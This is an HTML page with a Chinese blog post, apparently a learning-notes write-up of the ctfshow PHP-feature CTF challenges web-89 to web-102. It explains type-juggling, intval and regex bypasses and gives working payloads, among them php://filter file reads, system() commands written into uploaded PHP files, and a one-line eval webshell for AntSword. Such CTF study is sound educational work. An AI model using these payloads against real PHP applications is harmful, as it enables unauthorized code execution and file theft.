@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html  lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg">
+    <script>
+    ;(function () {
+      const prefersDark =
+        window.matchMedia &&
+        window.matchMedia('(prefers-color-scheme: dark)').matches
+      const setting = localStorage.getItem('vueuse-color-scheme') || 'auto'
+      if (setting === 'dark' || (prefersDark && setting !== 'light'))
+        document.documentElement.classList.toggle('dark', true)
+    })()
+    </script>
+  <style type="text/css">
+    :root { color-scheme: light dark; --va-c-bg: #fff; }
+    html.dark { --va-c-bg: #000; }
+    html { background-color: var(--va-c-bg); }
+  </style><style id="valaxy-fouc">body{opacity:0!important}</style><style>body{transition:opacity .15s ease}</style><noscript><style>body{opacity:1!important}</style></noscript><script>(function foucGuardScript(maxDuration) {
+  var done = 0;
+  function reveal() {
+    if (done) return;
+    done = 1;
+    var s = document.getElementById("valaxy-fouc");
+    if (s) s.remove();
+  }
+  function check() {
+    var links = document.querySelectorAll('link[rel="stylesheet"]');
+    for (var i = 0; i < links.length; i++) {
+      if (!links[i].sheet) return;
+    }
+    reveal();
+  }
+  new MutationObserver(check).observe(document.head, {
+    childList: true,
+    attributes: true,
+    attributeFilter: ["media", "rel"]
+  });
+  addEventListener("load", reveal);
+  if (maxDuration)
+    setTimeout(reveal, maxDuration);
+})(5000)</script>
+    <script>
+    const locale = localStorage.getItem('valaxy-locale') || 'zh-CN';
+    document.documentElement.setAttribute('lang', locale);
+    </script>
+    
+  <script type="module" crossorigin src="/assets/index.DMmPyM9k.js"></script>
+  <link rel="modulepreload" crossorigin href="/assets/rolldown-runtime.CPPQDwIl.js">
+  <link rel="modulepreload" crossorigin href="/assets/framework.DfD1zdSt.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-i18n.BSMUyWAh.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/@vueuse/motion.B1bNFY-Z.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/dayjs.Do72Hm6d.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/pinia.CMOAtTts.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-router.DZdD3Cav.js">
+  <link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/nprogress.CQax14yo.js">
+  <link rel="stylesheet" crossorigin href="/assets/style.BqWFzkuS.css">
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.BQhdFMY1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.DMm9YOAa.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.Dq_IR9rO.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.BEiXGLvX.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.Di6jR-x-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.CTRA-rTL.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.CL6g_b3V.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.BsDP51OF.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.CTYiF6lA.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.Dxdc4cR9.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Cx986IdX.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Jm3AIy58.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.DxDJ3AOS.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.SpSLRI95.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.NWA7e6Wa.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.BMLOBm91.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.B22Nviop.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.Dr94JaBh.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.CZnvNsCZ.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.iY-2wyZ7.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.t53AETM-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.DA0__PXp.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.D1sUS0GD.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.DbIhKOiC.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.C3H0VqGB.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.DN2j7dab.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.DDBCnlJ7.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.CS6fqUqJ.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D3wIWfF6.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D5yQViql.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.mCD8mA8B.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.C195tn64.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.Dy4dx90m.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.oD1tc_U0.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size3-Regular.CTq5MqoE.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.Dl5lxZxV.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.BF-4gkZK.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.CO6r4hn1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.C0xS9mPB.woff" as="font" type="font/woff" crossorigin>
+<link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+<link rel="preload" href="/assets/none.DLM1AMsD.jpg" as="image">
+<link rel="preload" href="/assets/bg-img.kXdNMxcF.jpg" as="image">
+<link rel="preload" href="/assets/sidebar-bg-img.mp54gEws.webp" as="image">
+<link rel="modulepreload" crossorigin href="/assets/ctfshow-php特性.Cg1i8is5.js">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ctfshow php特性 - 北沐城歌</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&display=swap">
+<meta property="og:locale:alternate" content="en">
+<meta name="description" content="山行野宿，孤身万里">
+<meta property="og:description" content="山行野宿，孤身万里">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:site_name" content="北沐城歌">
+<meta property="og:title" content="ctfshow php特性">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091526769.png">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://kinsey973.github.io/">
+<link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg" type="image/svg+xml">
+<meta name="generator" content="Valaxy 0.28.7">
+<meta name="theme-color" content="#fff">
+<meta name="msapplication-TileColor" content="#fff">
+<meta name="twitter:card" content="summary_large_image">
+</head>
+<body>
+  <div id="app"><!--[--><!--[--><!--[--><!----><!----><div class="yun-page-header-gradient"></div><div class="yun-nav-menu z-$yun-z-nav-menu fixed bg-transparent" data-v-1791e522><div class="inline-flex justify-start items-center flex-1" data-v-1791e522><button type="button" class="vt-hamburger menu-btn sidebar-toggle leading-4 size-12 lg:hidden" aria-label="mobile navigation" aria-expanded="false" inline-flex cursor="pointer" hover="bg-white/80 dark:bg-black/80" z="$yun-z-menu-btn" data-v-1791e522><span class="vt-hamburger-container"><span class="vt-hamburger-top"></span><span class="vt-hamburger-middle"></span><span class="vt-hamburger-bottom"></span></span></button><a href="/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 data-v-1791e522><!--[--><div class="size-6 i-ri-home-4-line"></div><!--]--></a><div class="hidden lg:contents" data-v-1791e522><!--[--><a href="/posts/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 title="menu.posts" data-v-1791e522><!--[--><div class="size-6 i-ri-article-line"></div><!--]--></a><!--]--></div></div><div class="flex flex-1 flex-center" data-v-1791e522><div flex="~ center col h-full" class="nav-menu-title-container cursor-pointer" data-v-1791e522><!----><span class="font-light truncate">北沐城歌</span></div></div><div class="inline-flex-center justify-end items-center flex-1" data-v-1791e522><button class="yun-icon-btn rounded-none! hidden sm:inline-flex" title="切换语言" style="color:var(--va-c-text);" data-v-1791e522><div i-ri-translate class="transition transform"></div></button><button class="yun-icon-btn yun-toggle-dark rounded-none!" title="切换深色模式" data-v-1791e522><div i="ri-sun-line dark:ri-moon-line"></div></button><!--[--><button class="yun-search-btn yun-icon-btn popup-trigger rounded-none! size-12 inline-flex justify-center items-center" text="xl $va-c-text" title="搜索"><div i-ri-search-line op-80 hover="op-100"></div></button><!----><!--]--></div></div><!----><!----><!----><!--[--><div class="yun-bg"></div><!--]--><!----><a href="#" class="back-to-top yun-icon-btn bg-$va-c-bg-soft shadow-md"><div class="size-8" i-ri-arrow-up-s-line></div><svg class="progress-circle-container" viewBox="0 0 100 100"><circle stroke-dasharray="301.59289474462014 301.59289474462014" stroke-dashoffset="301.59289474462014" stroke="currentColor" stroke-width="2" stroke-linecap="round" class="progress-circle" cx="50" cy="50" r="48" fill="none"></circle></svg></a><!--]--><!--[--><meting-js fixed="true" id="2049540645" server="netease" type="song" mini="true" mutex="false" listFolded="false" style=""></meting-js><!--]--><!----><!--]--><div class="min-h-screen flex flex-col"><div class="mt-12 md:mt-24 yun-layout-wrapper__content"><!--[--><div class="yun-layout-left gap-4 sticky top-$yun-margin-top w-80"><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden p-4 min-h-sm" flex="~ col gap-1" min-h="100px" bg="$va-c-bg-light"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><div class="site-info gap-1 items-center text-center" flex="~ col" p="t-8"><a href="/about" class="site-author-avatar inline-flex-center"><div class="relative yun-author-avatar"><div class="absolute size-full avatar-bg bg-image-$yun-home-hero-image-background-image filter-blur-2xl op-30"></div><img class="rounded-full size-full bg-white dark:bg-white/20 p-1 m-0 absolute" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png" alt="avatar"><span class="site-author-status absolute" title="The moonlight is beautiful.">💛</span></div></a><a href="/about" class="site-author-name font-black font-serif text-$va-c-text op-80 hover:op-100 flex-center">北歌</a><a href="/about/site" class="site-name text-lg leading-loose">北沐城歌</a><h4 class="site-subtitle block op-70" text="xs">北沐城歌|北歌的技术分享</h4><div class="site-description">山行野宿，孤身万里</div></div><div class="yun-gradient-line my-2 op-20"></div><nav class="site-nav" text-xl mt-2><a href="/archives/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="归档" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-archive-line"></div><div class="text-2xl icon-active i-ri-archive-fill"></div><span class="text-xs">归档</span></div><span class="count text-base text-black/80 dark:text-white/80">41</span></a><a href="/categories/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="分类" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-folder-2-line"></div><div class="text-2xl icon-active i-ri-folder-2-fill"></div><span class="text-xs">分类</span></div><span class="count text-base text-black/80 dark:text-white/80">6</span></a><a href="/tags/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="标签" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-price-tag-3-line"></div><div class="text-2xl icon-active i-ri-price-tag-3-fill"></div><span class="text-xs">标签</span></div><span class="count text-base text-black/80 dark:text-white/80">26</span></a></nav><div class="yun-gradient-line my-2 op-20"></div><div class="links-of-author"><!--[--><a class="links-of-author-item yun-icon-btn" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange;"><div class="i-ri-rss-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C;"><div class="i-ri-netease-cloud-music-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&amp;jump_from=webapi" title="QQ 2409101203" target="_blank" style="color:#12B7F5;"><div class="i-ri-qq-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://github.com/kinsey973" title="GitHub" target="_blank" style="color:#6e5494;"><div class="i-ri-github-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:white;"><div class="i-ri-train-line icon"></div></a><!--]--></div><div class="yun-gradient-line my-2 op-20"></div><div class="links flex-center"><!--[--><a href="/links/" class="va-link link-item yun-icon-btn" inline-flex title="网络世界的小伙伴们" style="color:hotpink;"><!--[--><div class="i-ri-open-arm-line icon size-6"></div><!--]--></a><a class="va-link link-item yun-icon-btn" inline-flex title="我的旧博客" style="color:#e16f00;" href="https://kinseyy.github.io/" target="_blank"><!--[--><div class="i-ri-quill-pen-line icon size-6"></div><!--]--><!----></a><a href="/categories/" class="va-link link-item yun-icon-btn" inline-flex title="分类" style="color:#f5f5f5;"><!--[--><div class="i-ri-apps-line icon size-6"></div><!--]--></a><a href="/tags/" class="va-link link-item yun-icon-btn" inline-flex title="标签" style="color:#f5f5f5;"><!--[--><div class="i-ri-bookmark-3-line icon size-6"></div><!--]--></a><!--]--></div><!--]--></div><!----></div><template></template><!--]--></div><main class="yun-main lt-md:w-full" flex="~ center"><!--[--><div class="content w-full md:w-3xl lg:w-2xl xl:w-2xl 2xl:w-4xl" flex="~ col grow" p="lt-md:0"><div class="yun-card flex-center rounded-2 overflow-hidden" flex="col" min-h="100px" bg="$va-c-bg-light" m="0"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><div class="mt-8 mb-4"><!--[--><header class="post-header"><h1 p="2" text="2xl center" font="serif black" style="color:" class="post-title flex-center"><!----><span inline-flex class="leading-none">ctfshow php特性</span></h1></header><!--]--></div><!--[--><!--[--><!--[--><!--[--><!----><div flex="~ center" text="sm" class="post-meta-col post-meta gap-4"><div class="post-time flex items-center gap-4"><span class="posted-time inline-flex-center gap-1" title="发表于2024-10-08 20:08:38"><div class="inline-block" i-ri-calendar-line></div><time class="op-80">2024-10-08</time></span><!----></div><!--[--><span id="busuanzi_container_page_pv"> 本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span><!--]--><div class="inline-flex-center gap-4"><div class="inline-flex-center post-counter gap-4"><span class="word-count inline-flex-center gap-1" title="本文字数"><div class="inline-block" i-ri-file-word-line></div><span class="op-80">1.8k</span></span><span class="reading-time inline-flex-center gap-1" title="阅读时长"><div i-ri-timer-line></div><time class="op-80">8m</time></span></div><!----><!----></div></div><!--]--><!----><div class="inline-flex mt-2" text="sm" py="1"><a href="/categories?category=%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" class="transition post-category inline-flex-center text-xs border-$va-c-divider" px-2 h="7" border rounded-full hover="bg-blue-500 text-white"><div m="x-1" inline-flex i-ri-folder-2-line></div><span>学习笔记</span></a><span mx="2"></span><div class="post-tags inline-flex" items="center" gap="1" flex="wrap 1" justify="end"><!--[--><a href="/tags/?tag=php%E7%89%B9%E6%80%A7" class="transition post-tag inline-flex-center text-xs border-$va-c-divider" px-2 h="7" rounded-full border hover="bg-blue-500 text-white"><span>php特性</span></a><a href="/tags/?tag=ctfshow" class="transition post-tag inline-flex-center text-xs border-$va-c-divider" px-2 h="7" rounded-full border hover="bg-blue-500 text-white"><span>ctfshow</span></a><!--]--></div></div><!--]--><!--]--><!--]--><div p="x-4 b-8" class="sm:px-6 lg:px-12 xl:px-16" w="full"><!--[--><!--]--><!--[--><article class="markdown-body"><!--[--><!----><!----><!--[--><!--]--><!--[--><p>摘要：web-php特性 url传入的数值都默认为字符串 web-89 重点在于绕过pregmatch函数，且num是个int类型的数字 我们可以通过数组进行绕过，就得到了flag ------ web-90 这题考察intval函数和强比较 强比较 在php中，三个等号“===”是全等比较运算符，用于比。</p><p>&lt;!-- more --&gt;</p><h3 id="web-php特性" tabindex="-1">web-php特性 <a class="header-anchor" href="#web-php特性" aria-label="Permalink to &quot;web-php特性&quot;">​</a></h3><p><strong>url传入的数值都默认为字符串</strong></p><h3 id="web-89" tabindex="-1">web-89 <a class="header-anchor" href="#web-89" aria-label="Permalink to &quot;web-89&quot;">​</a></h3><p>重点在于绕过preg_match函数，且num是个int类型的数字</p><p>我们可以通过数组进行绕过，就得到了flag</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091526769.png" alt="image-20240409152647713" loading="lazy" decoding="async"></figure><hr><h3 id="web-90" tabindex="-1">web-90 <a class="header-anchor" href="#web-90" aria-label="Permalink to &quot;web-90&quot;">​</a></h3><p>这题考察intval()函数和强比较</p><p><strong>强比较</strong></p><p>在php中，三个等号“===”是全等比较运算符，用于比较两个操作数的值是否相等，同时检测它们的类型</p><p>是否相同；只有两边的值和数据类型都相等时，运算结果才是TRUE。</p><p>这题传入num=4476a，原因是如果base=0时，当intval遇到字母，会自动停止</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091536900.png" alt="image-20240409153622847" loading="lazy" decoding="async"></figure><hr><h3 id="web-91" tabindex="-1">web-91 <a class="header-anchor" href="#web-91" aria-label="Permalink to &quot;web-91&quot;">​</a></h3><p>考察preg_match()和正则表达式</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091542431.png" alt="image-20240409154242409" loading="lazy" decoding="async"></figure><p>第一层由于/m存在为多行匹配，第二层为单行匹配，要想通过第一层且绕过第二层，我们使用换行绕过</p><p>传入<strong>cmd=%0Aphp</strong>就可以了，<strong>%0A为换行符的url编码</strong></p><p>这样传入的数就变成了：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>		//第一行为空格
+php		//第二行为php
+</code></pre><button class="code-block-unfold-btn"></button></div><p>就能拿到flag了</p><hr><h3 id="web-92" tabindex="-1">web-92 <a class="header-anchor" href="#web-92" aria-label="Permalink to &quot;web-92&quot;">​</a></h3><p>这道题考察的是intval函数和弱类型比较</p><p>但如果我们传入的num为4476a的话，</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>if($num==4476){
+    die(&quot;no no no!&quot;);
+  }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这层代码就会返回true，因此想要绕过这层代码同时使</p><p>下面这层代码成立，我们可以使用进制转换，intval会自动将字符串转换成指定的进制，且返回int类型</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>if(intval($num,0)==4476){
+    echo $flag;
+  }else{
+    echo intval($num,0);
+  }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>因此我们可以传入num=0x117c来获得flag</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091602933.png" alt="image-20240409160207822" loading="lazy" decoding="async"></figure><hr><h3 id="web-93" tabindex="-1"><strong>web-93</strong> <a class="header-anchor" href="#web-93" aria-label="Permalink to &quot;**web-93**&quot;">​</a></h3><p>这题和上题一样，但限制了字母，因此二进制，十六进制就不可以用了，但八进制没有被过滤掉</p><p>所以传入num=010574就能拿到flag了</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091608812.png" alt="image-20240409160816719" loading="lazy" decoding="async"></figure><hr><h3 id="web-94" tabindex="-1">web-94 <a class="header-anchor" href="#web-94" aria-label="Permalink to &quot;web-94&quot;">​</a></h3><p>得了，这道题由于strpos的存在，过滤掉了开头的0（还可以在数据前填个+号，这样0就不是第一位了）</p><p>，但我们发现$num===&quot;4476&quot;是个强类型比较，我们就可以传入num=4476.0，因为url传入的默认是字符串，所以这个强类型比较返回false，然后就能一路拿到flag了</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?num= 010574
+?num=4476.0
+?num=+010574
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404091614175.png" alt="image-20240409161434098" loading="lazy" decoding="async"></figure><hr><h3 id="web-95" tabindex="-1">web-95 <a class="header-anchor" href="#web-95" aria-label="Permalink to &quot;web-95&quot;">​</a></h3><p>把点过滤了，不过还是能在前面加空格、换行或者加减号.</p><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre><code class="language-php">?num= 010574
+?num=%0a010574
+?num=+010574
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092134708.png" alt="image-20240409213427619" loading="lazy" decoding="async"></figure><hr><h3 id="web-96" tabindex="-1">web-96 <a class="header-anchor" href="#web-96" aria-label="Permalink to &quot;web-96&quot;">​</a></h3><p>可以用php伪协议来做</p><p>传入?u=php://filter/convert.base64-encode/resource=flag.php</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092139703.png" alt="image-20240409213931618" loading="lazy" decoding="async"></figure><p>会得到一串base64编码，再通过解码就能得到flag</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092140263.png" alt="image-20240409214016225" loading="lazy" decoding="async"></figure><p>其它payload</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>./flag.php                            相对路径
+/var/www/html/flag.php                绝对路径
+php://filter/resource=flag.php        php伪协议 
+php://filter/read=convert.base64-encode/resource=flag.php
+
+</code></pre><button class="code-block-unfold-btn"></button></div><hr><h3 id="web-97" tabindex="-1">web-97 <a class="header-anchor" href="#web-97" aria-label="Permalink to &quot;web-97&quot;">​</a></h3><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092146409.png" alt="image-20240409214614357" loading="lazy" decoding="async"></figure><p>利用md5不能识别数组，且返回false来绕过md5得到flag</p><hr><h3 id="web-98" tabindex="-1">web-98 <a class="header-anchor" href="#web-98" aria-label="Permalink to &quot;web-98&quot;">​</a></h3><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092152768.png" alt="image-20240409215230746" loading="lazy" decoding="async"></figure><p>解释一下$_GET?<span class="katex-error" title="ParseError: KaTeX parse error: Expected &#39;EOF&#39;, got &#39;&amp;&#39; at position 6: _GET=&amp;̲" style="color:#cc0000;">_GET=&amp;</span>_POST:‘flag’;</p><p>如果get传入了一个值，就要用post传入的值覆盖掉,否则get传不进去</p><p>highlight_file($<em>GET[‘HTTP_FLAG’]==‘flag’?$flag:_<em>FILE</em></em>);</p><p>如果HTTP_FLAG通过get方式传入一个flag，就打开flag这个文件</p><p>所以POST：HTTP_FLAG=flag；GET随便传什么都行.</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404092156711.png" alt="image-20240409215642596" loading="lazy" decoding="async"></figure><hr><h3 id="web-99" tabindex="-1">web-99 <a class="header-anchor" href="#web-99" aria-label="Permalink to &quot;web-99&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>highlight_file(__FILE__);
+$allow = array();                //设置为数组
+for ($i=36; $i &lt; 0x36d; $i++) { 
+    array_push($allow, rand(1,$i));        //向数组里面插入随机数
+}
+if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow)){
+    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);
+}
+ 
+?&gt; 
+</code></pre><button class="code-block-unfold-btn"></button></div><p>函数in_array()第三个参数</p><p>is_array()可以判断一个值是否在数组中。</p><p>in_array(value,array,type) value ：要搜索的值</p><p>array ： 被搜索的数组</p><p>type ： 类型，true全等 ，false非全等（默认）</p><p>file_put_contents() 函数把一个字符串写入文件中。f</p><p>语法：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )
+filename： 必需。规定要写入数据的文件。 如果文件不存在，则创建一个新文件。 data： 必需。规定要写入文件的数据。可以是字符串、数组或数据流。
+</code></pre><button class="code-block-unfold-btn"></button></div><p>GET传入n=1.php</p><p>这题file_put_contents() 函数没有设置第三个参数，所以1.php和数字1比较时，1.php会转化为1再和1比较， 满足条件.</p><p>接着POST：<code>content=&lt;?php system(&quot;ls&quot;);?&gt;</code> 传入php代码到1.php中，然后访问1.php发现flag</p><p>查看flag，POST：<code>content=&lt;?php system(&quot;tac flag36d.php&quot;);?&gt;</code></p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404101923040.png" alt="image-20240410192315875" loading="lazy" decoding="async"></figure><h3 id="web-100" tabindex="-1">web-100 <a class="header-anchor" href="#web-100" aria-label="Permalink to &quot;web-100&quot;">​</a></h3><p>这题考察运算符的优先级</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+</code></pre><button class="code-block-unfold-btn"></button></div><p>由于=的优先级大于and，因此只要满足v1是个数字，v0就返回1</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>if($v0){
+    if(!preg_match(&quot;/\;/&quot;, $v2)){
+        if(preg_match(&quot;/\;/&quot;, $v3)){
+            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);
+        }
+    }
+    
+}
+</code></pre><button class="code-block-unfold-btn"></button></div><p>通过代码审计，v2不能存在；，而v3要存在一个；且在开头</p><p>我们可以用highlight_file()返回ctfshow.php中的内容</p><p>?v1=1&amp;v2=highlight_file(“ctfshow.php”)&amp;v3=;</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404102047602.png" alt="image-20240410204709521" loading="lazy" decoding="async"></figure><p>我们得到flag为a2eae7f30x2d8dc90x2d45560x2dad910x2d629eccb9bba4，接下来把0x2d换成-就能得到flag了</p><p>也可以传入?v1=1&amp;v2=eval($_POST[1])?%3E&amp;v3=; 传入一句话木马，然后使用蚁剑进行连接</p><hr><h3 id="web-101" tabindex="-1">web-101 <a class="header-anchor" href="#web-101" aria-label="Permalink to &quot;web-101&quot;">​</a></h3><p>这题考察反射和运算符的优先级</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+</code></pre><button class="code-block-unfold-btn"></button></div><p>根据上题的经验，我们可以知道v1=1,</p><p>由于v2,v3过滤了数字和特殊字符</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404111934695.png" alt="image-20240411193416613" loading="lazy" decoding="async"></figure><p>因此，这题我们考虑用ReflectionClass反射，</p><p>我们传入?v1=1&amp;v2=echo new RefectionClass&amp;v3=;</p><p>我们就能拿到flag值了</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404111935095.png" alt="image-20240411193542061" loading="lazy" decoding="async"></figure><p>我们把0x2d换成-，得到flag{6feae7fe-d7cd-4fea-9d47-30b0e0ee2be}，但当我们提交flag时，却提示我们flag错误，经过仔细对比，我们发现flag少了一位</p><p>我们可以手动爆破或通过bp，猜flag的最后一位（不演示了）</p><hr><h3 id="web-102" tabindex="-1">web-102 <a class="header-anchor" href="#web-102" aria-label="Permalink to &quot;web-102&quot;">​</a></h3><p>考察call_user_func函数和php版本特性</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>$a=&#39;&lt;?=`cat *`;&#39;;       //为什么用这个，主要是因为编码后带e,或者是编码后全部是数字
+$b=base64_encode($a);  // PD89YGNhdCAqYDs=
